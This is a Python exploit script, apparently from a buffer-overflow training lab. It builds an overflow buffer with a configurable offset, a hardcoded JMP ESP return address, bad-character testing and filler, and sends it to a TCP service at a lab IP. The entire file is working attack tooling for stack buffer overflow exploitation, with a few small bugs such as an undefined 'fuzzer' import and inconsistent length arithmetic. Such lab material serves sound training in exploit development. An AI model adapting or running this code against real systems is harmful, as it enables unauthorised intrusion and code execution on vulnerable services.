#!/usr/bin/env python3

import socket
import time
import sys
import subprocess
import struct
import fuzzer

help = """
Usage: fuzzing.py <ip> <port> <message>

| Name        | Code         | Description      |
|-------------|--------------|------------------|
| Target IP   | -u           | Target IP        |
| Target port | -p           | Target Port      |
| Message     | -m           | Custom message   |
| Offset      | -o           | Set offset       |
| Retn        | -r           | Set retn to BBBB |
| Payload     | -pay         | Set payload      |
| Find chars  | --find-chars | Find bad chars   |
| Jump        | -jmp         | Send jump payload|
|_____________|______________|__________________|
"""


def p32(data):
    return struct.pack("<I", data)


ip = "10.10.117.96"
port = 1337
timeout = 5
prefix = b"OVERFLOW1 "
offset = 0
jmp_esp = p32(0x625011AF)
all_chars = bytearray(range(1, 256))
bad_chars = []
find_chars = False
if "--find-chars" in sys.argv:
    bad_chars = []
    find_chars = True
    index = sys.argv.index("--find-chars")+1
    for i in sys.argv[index:]:
        bad_chars.append(bytes(i, 'latin-1'))
for bad_char in bad_chars:
    all_chars = all_chars.replace(bad_char, b"")


length = 0
retn = b""
padding = ""
payload = b"A"*offset
postfix = ""

if "-h" in sys.argv:
    print(help)
    exit(0)
if "-u" in sys.argv:
    ip = str(sys.argv[sys.argv.index("-u")+1])
if "-p" in sys.argv:
    port = str(sys.argv[sys.argv.index("-p")+1])
if "-m" in sys.argv:
    prefix = bytes(sys.argv[sys.argv.index("-m")+1], 'latin-1') + b" "
if "-o" in sys.argv:
    offset = int(sys.argv[sys.argv.index("-o")+1])
if "-r" in sys.argv:
    retn = b"BBBB"
if "-pay" in sys.argv:
    payload = bytes(sys.argv[sys.argv.index("-pay")+1], 'latin-1')*offset
if "-l" in sys.argv:
    length = int(sys.argv[sys.argv.index("-l")+1])

if find_chars:

    buffer = b"".join([
        prefix,
        payload,
        retn,
        all_chars,
        b"C"*(length-len(retn)-offset-len(all_chars)),
    ])
elif "-jmp" in sys.argv:
    buffer = b"".join([
        prefix,
        payload,
        jmp_esp,
        b"C"*(length-len(retn)-offset)
    ])
#buffer = prefix + overflow + retn + padding + payload + postfix
#s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    with socket.socket() as s:
        s.connect((ip, port))
        print("Sending evil buffer...")
        s.send(buffer)
        print("Done!")
except:
    print("Could not connect.")
